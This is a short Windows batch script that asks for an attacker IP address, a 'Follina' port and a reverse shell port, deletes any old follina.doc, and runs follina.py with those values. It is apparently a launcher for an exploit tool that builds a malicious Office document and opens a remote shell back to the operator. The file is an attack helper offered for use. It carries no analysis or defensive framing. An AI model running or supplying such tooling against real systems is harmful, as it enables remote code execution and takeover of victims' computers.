@echo off
@echo Please enter the required info
set /p MYIP="IP Address: "
set /p PORT="Follina Port: "
set /p REVERSE="Reverse shell port: "
del follina.doc
py follina.py -i %MYIP% --port %PORT% -r %REVERSE%
pause